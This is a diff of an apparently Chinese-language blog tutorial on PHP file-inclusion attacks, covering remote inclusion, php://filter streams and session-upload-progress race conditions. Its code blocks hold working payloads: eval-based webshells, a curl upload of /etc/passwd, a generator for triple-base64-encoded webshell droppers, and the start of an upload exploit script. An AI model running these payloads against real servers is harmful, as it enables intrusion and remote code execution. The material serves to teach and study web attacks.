@@ -188,8 +188,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-远程文件包含">4.2 远程文件包含</h3>
 <h4 id="421-条件">4.2.1 条件</h4>
@@ -206,8 +206,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">aaa.com/1.php?a
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">aaa.com/1.php?a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="43-伪协议">4.3 伪协议</h3>
 <h4 id="431-php-归档">4.3.1 PHP 归档</h4>
@@ -245,14 +245,14 @@ php://filter 目标使用以下的参数作为它路径的一部分。复合过�
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">string.toupper                                     //上面有写
-string.tolower                                     //转换为小写
-string.strip_tags                                  //去除html和php标记，比如&lt;?php?&gt;
-convert.base64-encode                              //base64编码
-convert.base64-decode                              //base64编码
-convert.quoted-printable-encode                    //quoted-printable 转 8bit
-convert.quoted-printable-decode                    //同上
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">string.toupper                                     //上面有写
+</span></span><span class="line"><span class="cl">string.tolower                                     //转换为小写
+</span></span><span class="line"><span class="cl">string.strip_tags                                  //去除html和php标记，比如&lt;?php?&gt;
+</span></span><span class="line"><span class="cl">convert.base64-encode                              //base64编码
+</span></span><span class="line"><span class="cl">convert.base64-decode                              //base64编码
+</span></span><span class="line"><span class="cl">convert.quoted-printable-encode                    //quoted-printable 转 8bit
+</span></span><span class="line"><span class="cl">convert.quoted-printable-decode                    //同上
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>DEMO：</p>
 <p><a href="http://chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener noreffer">http://chinalover.sinaapp.com/web7/index.php</a></p>
@@ -314,10 +314,10 @@ convert.quoted-printable-decode                    //同上
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nx">_GET</span><span class="p">[</span><span class="s1">&#39;orange&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nx">substr</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="nv">$_</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;@&lt;?php&#39;</span> <span class="o">?</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_</span><span class="p">)</span> <span class="o">:</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nx">_GET</span><span class="p">[</span><span class="s1">&#39;orange&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nx">substr</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="nv">$_</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;@&lt;?php&#39;</span> <span class="o">?</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_</span><span class="p">)</span> <span class="o">:</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个 session 文件并不一定要 <code>session_start</code> 才能生成，只要往服务器发送一个 <code>Cookie: PHPSESSID=xxx</code> 的值，然后用 session upload 的方式进行上传文件，就会生成这样一个 session 文件</p>
 <p>通过 curl 上传文件：</p>
@@ -326,8 +326,8 @@ convert.quoted-printable-decode                    //同上
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl http://IP/index.php -H <span class="s1">&#39;Cookie:PHPSESSID=iamnotorange&#39;</span> -F <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS=aaa&#39;</span> -F <span class="s1">&#39;file=@/etc/passwd&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://IP/index.php -H <span class="s1">&#39;Cookie:PHPSESSID=iamnotorange&#39;</span> -F <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS=aaa&#39;</span> -F <span class="s1">&#39;file=@/etc/passwd&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这样就可以控制文件名，接下来想办法控制文件内容。</p>
 <p>由于文件上传的速度比较快，有时候经常来不及看到保存在 session 文件中的 upload 信息，就会被删除。我们可以上传一个相对比较大的文件，并且条件竞争的方式。来先看一下保存在 session 中的文件内容。</p>
@@ -348,19 +348,19 @@ convert.quoted-printable-decode                    //同上
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;form action=&#34;upload.php&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
- &lt;input type=&#34;hidden&#34; name=&#34;&lt;?php echo ini_get(&#34;session.upload_progress.name&#34;); ?&gt;&#34; value=&#34;iamnotorange&#34; /&gt;
- &lt;input type=&#34;file&#34; name=&#34;file1&#34; /&gt;
- &lt;input type=&#34;file&#34; name=&#34;file2&#34; /&gt;
- &lt;input type=&#34;submit&#34; /&gt;
-&lt;/form&gt;
-&lt;?php
-session_start();
-$name = ini_get(&#39;session.upload_progress.name&#39;);
-$key = ini_get(&#39;session.upload_progress.prefix&#39;) . $_POST[$name];
-var_dump($_SESSION[$key]); 
-include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;upload.php&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span><span class="line"><span class="cl"> &lt;input type=&#34;hidden&#34; name=&#34;&lt;?php echo ini_get(&#34;session.upload_progress.name&#34;); ?&gt;&#34; value=&#34;iamnotorange&#34; /&gt;
+</span></span><span class="line"><span class="cl"> &lt;input type=&#34;file&#34; name=&#34;file1&#34; /&gt;
+</span></span><span class="line"><span class="cl"> &lt;input type=&#34;file&#34; name=&#34;file2&#34; /&gt;
+</span></span><span class="line"><span class="cl"> &lt;input type=&#34;submit&#34; /&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">session_start();
+</span></span><span class="line"><span class="cl">$name = ini_get(&#39;session.upload_progress.name&#39;);
+</span></span><span class="line"><span class="cl">$key = ini_get(&#39;session.upload_progress.prefix&#39;) . $_POST[$name];
+</span></span><span class="line"><span class="cl">var_dump($_SESSION[$key]); 
+</span></span><span class="line"><span class="cl">include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后开个多线程跑几次，就能看到通过条件竞争读出的文件内容：</p>
 <p><img
@@ -401,18 +401,18 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
-<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="p">;</span>
-<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
-    <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
-    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$data</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
-        <span class="k">echo</span> <span class="s2">&#34;一共解码了:&#34;</span><span class="o">.</span><span class="nv">$i</span><span class="p">,</span><span class="s2">&#34;次</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$data</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;一共解码了:&#34;</span><span class="o">.</span><span class="nv">$i</span><span class="p">,</span><span class="s2">&#34;次</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过脚本可以看到，只要三次就可以将前面的内容转换为成空。</p>
 <p>但是，由于 base64 是对 4 个字符为一组进行解码。<code>upload_progress_ </code>并不满足三次解码后允许字符是 4 的倍数(14 个有效字符，要求有效字符至少是 16 个)，就会把后面的字符算入填充，从而破坏原有传入的 php 代码。</p>
@@ -435,17 +435,17 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">triple_base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
-	<span class="k">return</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
-<span class="p">}</span>
-<span class="k">function</span> <span class="nf">triple_base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
-	<span class="k">return</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
-<span class="p">}</span>
-<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
-<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">triple_base64_encode</span><span class="p">(</span><span class="s2">&#34;&lt;?=\`id\`;&gt;&#34;</span><span class="p">);</span>
-
-<span class="k">echo</span> <span class="nx">triple_base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">triple_base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">triple_base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">triple_base64_encode</span><span class="p">(</span><span class="s2">&#34;&lt;?=\`id\`;&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">triple_base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>解码之后的数据是 <code>?</code></p>
 <p>而 <code>upload_progress_ZZ </code>在三次的解码中，第一次解码后留下了四个允许字符<code>hikY</code>，第二次解码没有允许字符，第三次就变成了空。</p>
@@ -474,23 +474,23 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-
-<span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
-<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
-	<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
-	<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">str_shuffle</span><span class="p">(</span><span class="nv">$str</span><span class="p">),</span><span class="mi">10</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
-	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
-	<span class="nv">$s_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$s</span><span class="p">));</span>
-	<span class="nv">$ss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
-	<span class="nv">$ss_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$ss</span><span class="p">));</span>
-	<span class="nv">$sss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$ss</span><span class="p">);</span>
-	<span class="k">if</span><span class="p">(</span><span class="nv">$s_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$ss_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$sss</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
-		<span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
-		<span class="k">break</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">str_shuffle</span><span class="p">(</span><span class="nv">$str</span><span class="p">),</span><span class="mi">10</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$s_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$s</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$ss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$ss_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$ss</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sss</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$ss</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$s_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$ss_length</span><span class="o">%</span><span class="mi">4</span><span class="o">==</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$sss</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">echo</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对于后面的 php 代码，也有一个要求，就是三次解密中都不能出现 <code>=</code>，因为base64中 <code>=</code> 只能放在编码的最后补位，出现在中间的话，<code>php://filter/convert.base64-decode </code>流就无法正常解析，就会报错。</p>
 <p>对此 oragne 师傅写了个脚本生成这玩意：</p>
@@ -512,21 +512,21 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
-<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">sample</span><span class="p">,</span> <span class="n">randint</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;@&lt;?php file_put_contents(&#39;/tmp/web&#39;, &#39;@&lt;?php eval($_GET[1])?&gt;&#39;); ?&gt;&#34;</span>
-
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">junk</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))</span>
-    <span class="n">x</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)</span>
-    <span class="n">xx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">))</span>
-    <span class="n">xxx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)))</span>
-    <span class="k">if</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xx</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xxx</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">xxx</span><span class="p">)</span>
-        <span class="k">break</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">sample</span><span class="p">,</span> <span class="n">randint</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;@&lt;?php file_put_contents(&#39;/tmp/web&#39;, &#39;@&lt;?php eval($_GET[1])?&gt;&#39;); ?&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">junk</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xxx</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="n">junk</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xx</span> <span class="ow">and</span> <span class="s1">&#39;=&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">xxx</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">xxx</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>VVVSM0wyTkhhSGRKUjFwd1lrZFdabU5JVmpCWU1rNTJZbTVTYkdKdVVucExRMk4yWkVjeGQwd3paR3haYVdOelNVTmtRVkJFT1hkaFNFRm5XbGhhYUdKRFoydFlNR1JHVmtaemVGaFRheTlRYVdOd1QzbEJMMUJzVGxGVmEwNUZWbXh3YTFSRk5UTmlNMHB6</p>
 <h3 id="46--长文件名截断">4.6 ./ 长文件名截断</h3>
@@ -605,38 +605,38 @@ include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
 </span><span class="lnt">31
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">itertools</span>
-<span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
-<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;192.168.43.155&#34;</span>
-<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
-<span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">upload_file_to_include</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">):</span>
-    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;evil.jpg&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="nb">print</span> <span class="n">e</span>
-<span class="k">def</span> <span class="nf">generate_tmp_files</span><span class="p">():</span>
-    <span class="n">webshell_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval($_REQUEST[c]);?&gt;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
-        <span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
